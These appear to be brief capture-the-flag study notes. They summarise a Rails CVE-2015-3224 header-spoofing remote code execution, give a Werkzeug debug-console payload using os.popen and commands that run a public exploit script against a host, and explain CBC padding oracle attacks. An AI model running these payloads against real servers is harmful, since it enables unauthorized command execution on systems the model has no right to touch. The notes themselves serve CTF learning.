## CTF Badge

### CVE-2015-3224:
Rails 4.0 and 4.1 X-Forwarded-For:localhost on 404 -> RCE


### Werkzeug DEBUG

This challenge was written for Ruxcon CTF 2015 and cover the Debug mode of Werkzeug/Flask

go to url/console
use __import__('os').popen('<cmd>').read()

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

git clone https://github.com/its-arun/Werkzeug-Debug-RCE.git
cd Werkzeug-Debug-RCE
chmod +x werkzeug.py
python werkzeug.py ptl-63e89638-8b2f2181.libcurl.so ls

### Padding Oracle

- CBC is an encryption mode in which the message is split into blocks of X bytes length and each block is XORed with the previous encrypted block. The result is then encrypted.
- Padding can be done in multiple ways. A common way is to use PKCS7. With PKCS7, the padding will be composed of the same number: the number of bytes missing. For example, if the cleartext is missing 2 bytes, the padding will be \x02\x02.
- During the cleanup of the padding, if an invalid padding triggers a detectable behavior, you have a padding oracle. The detectable behavior can be an error, a lack of results, or a slower response.


